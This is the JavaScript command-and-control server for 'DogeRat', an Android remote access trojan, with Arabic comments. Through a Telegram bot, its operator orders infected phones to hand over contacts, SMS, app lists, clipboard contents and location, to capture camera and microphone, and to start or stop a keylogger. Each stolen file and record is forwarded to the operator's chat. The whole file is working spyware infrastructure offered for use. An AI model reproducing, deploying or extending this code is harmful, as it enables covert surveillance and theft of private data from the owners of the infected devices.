// ========== تقليل السجلات ==========
const isProduction = process.env.NODE_ENV === 'production' || true;

// إخفاء السجلات غير الضرورية في الإنتاج
if (isProduction) {
    const originalLog = console.log;
    const originalInfo = console.info;
    const originalWarn = console.warn;
    
    console.log = function() {
        // فقط سجل الأخطاء والتحذيرات المهمة
        const args = Array.from(arguments);
        if (args.some(arg => typeof arg === 'string' && 
            (arg.includes('❌') || arg.includes('⚠️') || arg.includes('✅')))) {
            originalLog.apply(console, args);
        }
    };
    
    console.info = function() {};
    console.warn = function() {
        // احتفظ بالتحذيرات المهمة فقط
        const args = Array.from(arguments);
        if (args.some(arg => typeof arg === 'string' && arg.includes('⚠️'))) {
            originalWarn.apply(console, args);
        }
    };
}

console.log('✅ Server starting with minimal logging...');

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// ========== قراءة الإعدادات من ملف data.json ==========
let data;
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (error) {
    console.error('❌ Failed to read data.json:', error);
    process.exit(1);
}

// ========== إعدادات السيرفر ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

// ========== إعدادات البوت ==========
const bot = new telegramBot(data.token, { 
    polling: true,
    pollingOptions: {
        timeout: 30,
        limit: 100,
        retryTimeout: 5000
    }
});

// معالجة أخطاء البولينغ
bot.on('polling_error', (error) => {
    console.log('⚠️ Polling error:', error.code);
    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
        console.log('🔄 Reconnecting bot...');
        setTimeout(() => {
            try {
                bot.startPolling();
            } catch (e) {
                console.log('❌ Reconnection failed:', e.message);
            }
        }, 5000);
    }
});

// ========== تخزين البيانات ==========
const connectedDevices = new Map();

// ========== إعدادات Express ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== المسارات ==========
app.get('/', (req, res) => {
    res.send('✅ DogeRat Server is running!');
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// ========== أوامر البوت ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '⛔ Unauthorized access!');
        return;
    }

    bot.sendMessage(data.id, `
<b>✯ Welcome to DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

bot.onText(/✯ Devices ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '<b>✯ There is no connected device</b>', {
            parse_mode: 'HTML'
        });
        return;
    }

    let message = `<b>✯ Connected devices count: ${connectedDevices.size}</b>\n\n`;
    let index = 1;
    const deviceButtons = [];

    for (const [deviceId, device] of connectedDevices) {
        message += `<b>${index}.</b>\n`;
        message += `<b>device</b> → ${device.name}\n`;
        message += `<b>model</b> → ${device.model}\n`;
        message += `<b>ip</b> → ${device.ip}\n`;
        message += `<b>time</b> → ${device.time}\n\n`;
        deviceButtons.push([deviceId]);
        index++;
    }

    deviceButtons.push(['✯ All ✯']);
    deviceButtons.push(['✯ Cancel action ✯']);

    bot.sendMessage(data.id, message, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: deviceButtons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

bot.onText(/✯ All ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, '<b>✯ Select action to perform for all available devices</b>', {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Contacts ✯', '✯ SMS ✯'],
                ['✯ Apps ✯', '✯ Main camera ✯'],
                ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                ['✯ Vibrate ✯', '✯ Toast ✯'],
                ['✯ Clipboard ✯', '✯ Notification ✯'],
                ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// ========== معالجة الأوامر الفردية ==========
const handleDeviceCommand = (msg, command) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }

    // أرسل الأمر لأول جهاز متصل
    const [deviceId] = connectedDevices.keys();
    io.to(deviceId).emit('command', { request: command });
    bot.sendMessage(data.id, `📩 ${command} command sent to device!`);
};

bot.onText(/✯ Contacts ✯/, (msg) => handleDeviceCommand(msg, 'contacts'));
bot.onText(/✯ SMS ✯/, (msg) => handleDeviceCommand(msg, 'sms'));
bot.onText(/✯ Apps ✯/, (msg) => handleDeviceCommand(msg, 'apps'));
bot.onText(/✯ Main camera ✯/, (msg) => handleDeviceCommand(msg, 'main-camera'));
bot.onText(/✯ Selfie Camera ✯/, (msg) => handleDeviceCommand(msg, 'selfie-camera'));
bot.onText(/✯ Microphone ✯/, (msg) => handleDeviceCommand(msg, 'microphone'));
bot.onText(/✯ Vibrate ✯/, (msg) => handleDeviceCommand(msg, 'vibrate'));
bot.onText(/✯ Toast ✯/, (msg) => handleDeviceCommand(msg, 'toast'));
bot.onText(/✯ Clipboard ✯/, (msg) => handleDeviceCommand(msg, 'clipboard'));
bot.onText(/✯ Notification ✯/, (msg) => handleDeviceCommand(msg, 'notification'));
bot.onText(/✯ Keylogger ON ✯/, (msg) => handleDeviceCommand(msg, 'keylogger-on'));
bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleDeviceCommand(msg, 'keylogger-off'));

bot.onText(/✯ About us ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, `
<b>✯ About DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, { parse_mode: 'HTML' });
});

bot.onText(/✯ Cancel action ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, '✅ Action cancelled', {
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

// ========== اتصالات Socket.IO ==========
io.on('connection', (socket) => {
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    const deviceIp = socket.handshake.address || 'Unknown';
    const deviceId = socket.id;

    const deviceInfo = {
        id: deviceId,
        name: deviceName,
        model: deviceModel,
        ip: deviceIp,
        time: new Date().toLocaleString()
    };
    connectedDevices.set(deviceId, deviceInfo);

    bot.sendMessage(data.id, `
<b>✯ New device connected</b>

<b>device</b> → ${deviceName}
<b>model</b> → ${deviceModel}
<b>ip</b> → ${deviceIp}
<b>time</b> → ${new Date().toLocaleString()}
    `, { parse_mode: 'HTML' });

    // استقبال الأوامر من الجهاز
    socket.on('command', (commandData) => {
        const { request } = commandData;
        const device = connectedDevices.get(socket.id);
        console.log(`📩 Command received: ${request} from ${device?.name}`);
        bot.sendMessage(data.id, `📩 Command received: ${request} from ${device?.name || 'Unknown'}`);
    });

    // استقبال البيانات من الجهاز
    socket.on('data', (socketData) => {
        const { type, content } = socketData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        console.log(`📊 Data received: ${type} from ${deviceName}`);

        switch (type) {
            case 'contacts':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📋 Contacts from: ${deviceName}`,
                    filename: `contacts_${deviceName}.json`
                });
                break;

            case 'sms':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `💬 SMS messages from: ${deviceName}`,
                    filename: `sms_${deviceName}.json`
                });
                break;

            case 'apps':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📱 Apps from: ${deviceName}`,
                    filename: `apps_${deviceName}.json`
                });
                break;

            case 'location':
                bot.sendMessage(data.id, `
📍 <b>Location received from ${deviceName}</b>

🌐 Latitude: ${content.lat}
🌐 Longitude: ${content.lng}
🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
                `, { parse_mode: 'HTML' });
                break;

            case 'clipboard':
                bot.sendMessage(data.id, `
📋 <b>Clipboard from ${deviceName}</b>

${content}
                `, { parse_mode: 'HTML' });
                break;

            default:
                console.log('📦 Unknown data type:', type);
                bot.sendMessage(data.id, `📦 Unknown data type: ${type} from ${deviceName}`);
        }
    });

    // استقبال الملفات
    socket.on('file', (fileData) => {
        const { filename, content } = fileData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        bot.sendDocument(data.id, Buffer.from(content), {
            caption: `📁 File from: ${deviceName}`,
            filename: filename
        });
    });

    // انقطاع الاتصال
    socket.on('disconnect', () => {
        const device = connectedDevices.get(socket.id);
        if (device) {
            connectedDevices.delete(socket.id);
            bot.sendMessage(data.id, `
<b>✯ Device disconnected</b>

<b>device</b> → ${device.name}
<b>model</b> → ${device.model}
<b>time</b> → ${new Date().toLocaleString()}
            `, { parse_mode: 'HTML' });
        }
    });
});

// ========== تشغيل السيرفر ==========
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Bot is ready!`);
    console.log(`✅ Connected devices: 0`);
    console.log(`✅ Using data.json with token: ${data.token.substring(0, 15)}...`);
});

// ========== معالجة الأخطاء ==========
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});
